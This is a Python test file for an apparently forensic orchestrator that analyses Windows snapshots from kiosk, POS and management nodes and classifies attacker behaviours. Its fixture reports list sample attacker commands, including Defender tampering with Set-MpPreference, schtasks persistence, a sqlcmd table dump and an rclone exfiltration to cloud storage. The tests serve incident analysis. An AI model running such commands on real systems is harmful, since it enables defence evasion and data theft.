"""멀티 노드 실전 실행 오케스트레이터의 결정론 부분."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "tools"))

import run_campaign_live as runner  # noqa: E402


def _campaign(path: Path) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(
            {
                "campaign_id": "K2L3-TEST",
                "nodes": [
                    {"node": "kiosk", "case_id": "K2L3-KIOSK"},
                    {"node": "pos", "case_id": "K2L3-POS"},
                    {"node": "mgmt", "case_id": "K2L3-MGMT"},
                ],
            }
        ),
        encoding="utf-8",
    )
    return path


def test_evidence_discovery_enters_the_snapshot_volume_root(tmp_path):
    volume = tmp_path / "KIOSK_snapshotA_20260908T032657" / "C"
    (volume / "Windows").mkdir(parents=True)
    (tmp_path / "KIOSK_snapshotA_20260908T032657.zip").write_bytes(b"archive")

    found = runner.find_evidence_for_node(
        {"node": "kiosk", "case_id": "K2L3-KIOSK"}, tmp_path
    )

    assert found == volume.resolve()


def test_evidence_discovery_refuses_ambiguous_snapshots(tmp_path):
    for name in ("POS_snapshotA", "POS_snapshotB"):
        (tmp_path / name / "C" / "Windows").mkdir(parents=True)

    with pytest.raises(runner.OrchestratorError, match="둘 이상"):
        runner.find_evidence_for_node(
            {"node": "pos", "case_id": "K2L3-POS"}, tmp_path
        )


def test_live_command_carries_every_requested_tuning_flag(tmp_path):
    args = runner.parse_args(
        [
            "--raw",
            "분석해주세요",
            "--model",
            "qwen2.5:latest",
            "--mode",
            "assemble",
            "--max-chunks",
            "12",
            "--num-ctx",
            "32768",
            "--loop",
        ]
    )

    command = runner.build_live_command(
        args,
        {"node": "kiosk", "case_id": "K2L3-KIOSK"},
        tmp_path / "evidence",
        tmp_path / "cases",
        replace_existing=True,
    )

    assert command[0] == sys.executable
    assert "tools/live_check.py" in command
    assert command[command.index("--case-id") + 1] == "K2L3-KIOSK"
    assert command[command.index("--max-chunks") + 1] == "12"
    assert command[command.index("--num-ctx") + 1] == "32768"
    assert "--loop" in command
    assert "--force" in command


def test_no_loop_is_available_even_though_loop_is_the_default():
    assert runner.parse_args(["--raw", "x"]).loop is True
    assert runner.parse_args(["--raw", "x", "--no-loop"]).loop is False


def test_report_summary_counts_and_reviewed_behaviors(tmp_path):
    report = tmp_path / "07_report.md"
    report.write_text(
        """# 보고서
- 검증 결과: 통과 3 / 주의 1 / 기각 2
## 확인된 사실 (🟢 Passed)
powershell Set-MpPreference 후 schtasks를 만들었다.
sqlcmd로 SELECT * FROM management.dbo.settlements를 CSV로 저장했다.
rclone copy C:\\exfil gdrive:incident
## 주의 필요 소견
nmap으로 대상을 조사했다.
## 미확인 사항
RDP는 확인하지 못했다.
""",
        encoding="utf-8",
    )

    summary = runner.read_report_summary("mgmt", "C-MGMT", report)

    assert (summary.passed, summary.warning, summary.rejected, summary.total) == (
        3,
        1,
        2,
        6,
    )
    assert "방어 회피" in summary.behaviors
    assert "지속성" in summary.behaviors
    assert "수집" in summary.behaviors
    assert "유출" in summary.behaviors
    assert "횡적 이동" not in summary.behaviors


def test_behavior_summary_does_not_treat_a_technique_heading_as_evidence(tmp_path):
    report = tmp_path / "07_report.md"
    report.write_text(
        """- 검증 결과: 통과 1 / 주의 0 / 기각 0
## 확인된 사실 (🟢 Passed)
### F1 — T1048 Exfiltration Over Alternative Protocol
nmap.exe로 내부 주소를 조사했다.
## 미확인 사항
""",
        encoding="utf-8",
    )

    summary = runner.read_report_summary("kiosk", "C-KIOSK", report)

    assert "정찰" in summary.behaviors
    assert "유출" not in summary.behaviors


def test_main_runs_nodes_in_order_then_stage08(monkeypatch, tmp_path, capsys):
    campaign_path = _campaign(tmp_path / "campaigns" / "K2L3" / "campaign.json")
    evidence_dir = tmp_path / "evidence"
    cases_dir = tmp_path / "cases"
    for name in ("KIOSK_snapshotA", "POS_snapshotB", "MGMT_snapshotB"):
        (evidence_dir / name / "C" / "Windows").mkdir(parents=True)

    calls: list[list[str]] = []

    def fake_run(command, **_kwargs):
        calls.append(list(command))
        if "tools/live_check.py" in command:
            case_id = command[command.index("--case-id") + 1]
            case_dir = cases_dir / case_id
            case_dir.mkdir(parents=True, exist_ok=True)
            (case_dir / "07_report.md").write_text(
                "- 검증 결과: 통과 1 / 주의 0 / 기각 0\n"
                "## 확인된 사실 (🟢 Passed)\nwhoami\n"
                "## 미확인 사항\n",
                encoding="utf-8",
            )
        else:
            out_dir = Path(command[command.index("--out") + 1])
            out_dir.mkdir(parents=True, exist_ok=True)
            (out_dir / "08_campaign.md").write_text("# campaign", encoding="utf-8")
            (out_dir / "08_campaign.json").write_text(
                json.dumps(
                    {
                        "links": [
                            {
                                "axis": "peer",
                                "value": "10.0.0.2",
                                "grade": "observed",
                                "observations": [
                                    {"node": "kiosk"},
                                    {"node": "pos"},
                                ],
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )

        class Result:
            returncode = 0

        return Result()

    monkeypatch.setattr(runner, "CASES_DIR", cases_dir)
    monkeypatch.setattr(runner.subprocess, "run", fake_run)

    code = runner.main(
        [
            "--campaign",
            str(campaign_path),
            "--evidence-dir",
            str(evidence_dir),
            "--raw",
            "키오스크에서 관리서버까지 분석해주세요.",
        ]
    )

    assert code == 0
    assert [call[call.index("--case-id") + 1] for call in calls[:3]] == [
        "K2L3-KIOSK",
        "K2L3-POS",
        "K2L3-MGMT",
    ]
    assert calls[3][1:3] == ["-m", "src.stage08_campaign.campaign"]
    output = capsys.readouterr().out
    assert "kiosk → pos" in output
    assert "campaign 순서 피어 체인" in output
